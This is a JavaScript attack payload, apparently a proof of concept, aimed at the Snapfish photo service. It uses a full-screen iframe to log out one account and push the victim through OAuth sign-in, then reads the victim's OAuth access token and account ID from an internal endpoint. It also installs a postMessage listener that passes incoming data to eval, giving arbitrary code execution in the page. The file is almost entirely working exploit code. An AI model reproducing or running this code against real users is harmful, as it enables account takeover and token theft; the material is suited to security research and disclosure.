//Logout Attacker's Account

var profileIframe2 = document.createElement('iframe');
profileIframe2.setAttribute('src', 'https://www.snapfish.com/logout');
profileIframe2.setAttribute('width', '100%');
profileIframe2.setAttribute('height', '500px');
profileIframe2.setAttribute('style', 'position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;');

document.body.appendChild(profileIframe2);

//Login to Victim's Account using oAuth Login
//profileIframe2.setAttribute('src', 'https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=527231285582946&next=https%3A%2F%2Fwww.snapfish.com%2Fhome&SubscriptionFlag=ALL');
setTimeout(() => {
  profileIframe2.setAttribute('src', "https://www.snapfish.com/loginto");
}, 10000)

//setTimeout(() => {profileIframe2.setAttribute('src', 'javascript:document.getElementById("googleSignInButton").click();');}, 20000)
googleLink = "https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=1"
/*
setTimeout(() => {
  profileIframe2.setAttribute('src', googleLink);
}, 20000)
*/
function getOAUTH() {
  url = "https://www.snapfish.com/library/getOauthInfo"
  access_token = "text.oauthInfo.oa2";
  account_id = "text.oauthInfo.accountId";
  
  req = new XMLHttpRequest();
  req.responseType = 'json';
  req.open('GET', url, true);
  req.onload = function () {
    var jsonResponse = req.response;
    access_token = jsonResponse.oauthInfo.oa2;
    account_id = jsonResponse.oauthInfo.accountId;
    alert("ACCESS TOKEN is " + access_token + "\nAccount ID is " + account_id);
  };
  req.send(null);
}

window.addEventListener('message', message => {
    if (message.type === "eval") {
        eval(message.data);
    }
  console.log(message)
});

